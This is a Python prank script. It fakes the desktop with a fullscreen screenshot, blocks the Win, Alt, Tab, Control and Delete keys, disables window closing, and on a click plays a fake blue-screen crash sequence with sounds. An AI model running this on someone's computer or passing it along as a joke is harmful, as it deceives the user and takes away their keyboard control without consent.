import tkinter as tk
import time
import winsound
import pyautogui
import os,sys
import keyboard
from PIL import Image, ImageTk

ISRUN = False

time.sleep(2)

dir = os.path.dirname(os.path.abspath(sys.argv[0]))
print(dir)

time.sleep(0.3)
im = pyautogui.screenshot("desktop.png")

root = tk.Tk()
root.geometry("{}x{}+0+0".format(root.winfo_screenwidth(),root.winfo_screenheight()))

bg = tk.PhotoImage(file="desktop.png")
bgimage = tk.Label(root, image=bg, width=root.winfo_screenwidth(), height=root.winfo_screenheight(), borderwidth=0)
bgimage.place(x=0, y=0)

keyboard.block_key("win")
keyboard.block_key("alt")
keyboard.block_key("tab")
keyboard.block_key("control")
keyboard.block_key("delete")

def initiate(e):
    global ISRUN
    if ISRUN == False:
        ISRUN = True
        time.sleep(1)
        updateImg(1,4)
        updateImg(2,6)
        updateImg(3,7)
        updateImg(4,0.01)
        winsound.PlaySound(dir+'/noise3.wav',winsound.SND_ASYNC)
        updateImg(3,3)
        winsound.PlaySound(dir+'/noise2.wav',winsound.SND_ASYNC)
        updateImg(6,0.01)
        updateImg(3,1.5)
        winsound.PlaySound(dir+'/noise3.wav',winsound.SND_ASYNC)
        updateImg(1,0.01)
        updateImg(1,0.75)
        winsound.PlaySound(dir+'/final.wav',winsound.SND_ASYNC)
        updateImg(5,3)
        winsound.PlaySound(dir+'/loop.wav',winsound.SND_ASYNC)
        updateImg(7,4)
        root.destroy()

def updateImg(number, sleepNum):
    imgName = dir+"/BSOD/bsod" + str(number) + ".png"
    img = Image.open(imgName).resize(
        (root.winfo_screenwidth(), root.winfo_screenheight()), Image.LANCZOS
    )
    bg1 = ImageTk.PhotoImage(img)

    bgimage.configure(image=bg1, cursor='none')
    root.update()
    time.sleep(sleepNum)

bgimage.bind('<Button-1>', initiate)
root.attributes("-fullscreen", True)

root.protocol('WM_DELETE_WINDOW', lambda: None)


# Block Alt key combinations and other potential escape keys


# Bind all keys to the blocker function


root.attributes('-topmost', True)
root.update()


root.mainloop()